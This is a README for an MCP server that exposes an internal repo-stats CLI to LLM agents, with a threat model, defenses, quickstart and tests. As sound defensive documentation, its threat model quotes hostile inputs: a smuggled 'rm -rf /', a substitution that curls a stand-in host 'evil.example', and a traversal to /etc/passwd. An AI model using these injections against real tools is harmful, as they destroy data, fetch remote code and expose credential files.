# internal-tools-bridge MCP server

A stdio-transport MCP server that exposes an in-repo CLI as a structured-args
MCP tool. This is the fourth cookbook entry; it demonstrates the
**internal-tools bridge** pattern — wrapping an existing internal CLI so
agents can invoke it safely without giving them a shell.

The bundled CLI is **`bin/repo-stats.mjs`**: a dep-free Node script that
walks a directory and returns file counts by extension plus total bytes.
It's a stand-in for whatever internal command-line tool a team would
actually want to expose (an audit script, a deploy helper, a CSV
summarizer). The interesting code is not the CLI itself but the
**`src/bridge.ts`** posture that runs it.

## Tools

| Tool         | Input                                                    | Output                                               |
|--------------|----------------------------------------------------------|------------------------------------------------------|
| `repo_stats` | `{ path: string, max_depth?: 1..10 }`                    | JSON: `{ root, total_files, total_bytes, by_ext }`   |

## Threat model

This server is wired into an LLM agent that the operator trusts to
*invoke a fixed set of internal CLIs* but does not trust to *escape the
sandbox they run in*. The threats it defends against, ranked by severity:

### 1. Arbitrary command execution

The agent emits a `repo_stats` call with `path` set to `"; rm -rf /"`
or `$(curl evil.example)` or `../../../etc/passwd`.

**Defenses (D-009 — shell-free spawn, all layers):**
- **No shell.** [`src/bridge.ts`](src/bridge.ts) calls
  `child_process.spawn(binary, args, { shell: false })`. Shell
  metacharacters (`;`, `&&`, `|`, `$()`, `>`, `<`) cannot be interpreted
  because no shell runs — they would be passed as a single literal argv
  entry to the child process. The bundled regression test in
  [`test/bridge.test.ts`](test/bridge.test.ts) sends those exact tokens
  and asserts they survive untouched.
- **Binary allowlist.** The bridge accepts only binaries whose absolute
  paths are in `BridgeConfig.allowlist`. Relative paths and PATH
  lookups are rejected (`AllowlistError`). The default config seeds the
  allowlist with `process.execPath` only — i.e., the running Node
  binary — and the only script the server invokes is the bundled
  `bin/repo-stats.mjs`.
- **Structured input.** The MCP tool's schema is `{ path: string,
  max_depth?: integer }`. `path` is required, non-empty, no NUL byte;
  `max_depth` is an integer in `[1, 10]`. Inputs are validated by
  `validateRepoStatsInput` *before* the argv array is built; the
  validation never returns the raw input back as a command string.

### 2. Secret exfiltration via the spawned child

The agent's CLI is wrapped, but the operator has API keys or tokens in
the process environment (`ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, etc.).
A compromised or buggy CLI could print or upload them.

**Defenses:**
- **Env scrub.** Before each spawn, the bridge constructs a fresh env
  containing only the values from `ENV_PASSLIST`: `PATH`, `LANG`,
  `LC_ALL`, `TZ`, `NODE_OPTIONS`. All other variables from the parent
  process — `MCP_BRIDGE_TEST_SECRET` and anything else — are dropped.
  The regression test in `bridge.test.ts > env scrub` plants a secret
  in the parent's env and asserts the child reads back `null`.

### 3. Resource exhaustion / runaway processes

A CLI hangs in a `while (true) {}` loop, or emits gigabytes to stdout,
or forks recursively.

**Defenses:**
- **Per-call timeout.** Every spawn carries a `timeoutMs` (default
  10s). On expiry the bridge sends `SIGKILL` and rejects with
  `TimeoutError`.
- **Output cap.** Stdout and stderr are each capped at
  `MAX_OUTPUT_BYTES` (default 1 MiB). On overflow the bridge sends
  `SIGKILL` and rejects with `OutputCapError`.
- **cwd lock.** The child's working directory is fixed at construction
  time (defaults to `process.cwd()`; overridable via the `MCP_BRIDGE_CWD`
  env var). The CLI cannot `cd` somewhere unexpected — there's no
  shell — and any relative-path argument it receives is resolved
  against the locked cwd.

### Out of scope

- **Filesystem sandboxing** — the bundled `repo-stats` CLI can read any
  directory it has POSIX permission to read. If that's too wide, run
  the server as a user with restricted FS access, or wrap it in the
  `filesystem-sandbox` server instead. Bridge + sandbox is a future
  composition pattern.
- **Output classification** — the server returns the CLI's JSON
  verbatim. If the CLI itself prints secrets (it shouldn't), that's a
  CLI bug, not a bridge bug.

## Quickstart

```bash
cd servers/internal-tools-bridge
npm install
npm run build

# Run a one-shot tool call without an MCP client, using the test
# fixtures' pattern (writes JSON on stdout):
node dist/server.js < /dev/null  # starts the stdio server
```

Or wire it into Claude Desktop / a custom MCP client by registering
`node dist/server.js` as the command, with optional `MCP_BRIDGE_CWD`
env to lock the cwd.

## End-to-end example

`repo_stats` invoked on this server's own directory:

```json
{
  "jsonrpc": "2.0", "method": "tools/call", "params": {
    "name": "repo_stats",
    "arguments": { "path": "./", "max_depth": 3 }
  }
}
```

Returns (paths and counts are real on a fresh clone):

```json
{
  "root": "/.../servers/internal-tools-bridge",
  "total_files": 14,
  "total_bytes": 28471,
  "by_ext": {
    ".js": 1,
    ".json": 3,
    ".md": 1,
    ".mjs": 1,
    ".ts": 5,
    "<none>": 3
  }
}
```

## Tests

```bash
npm test          # 20 tests (10 bridge, 10 tools), ~800ms
npm run lint
npm run typecheck
```

The two load-bearing tests:
- `runBridged — argv shape > never invokes a shell` — passes `&&`, `|`,
  `$()`, `>`, `/dev/null` as argv data; asserts they appear at the
  child's `argv` verbatim. If `shell: true` ever leaks into the spawn
  config, this test fails loudly.
- `runBridged — env scrub > does not leak secrets from process.env` —
  plants a sentinel env var; asserts the child reads back `null`.

## Why these decisions

D-009 (shell-free bridge with allowlist + env scrub + output cap + timeout)
in [`MEMORY/core_decisions_human.md`](../../MEMORY/core_decisions_human.md).
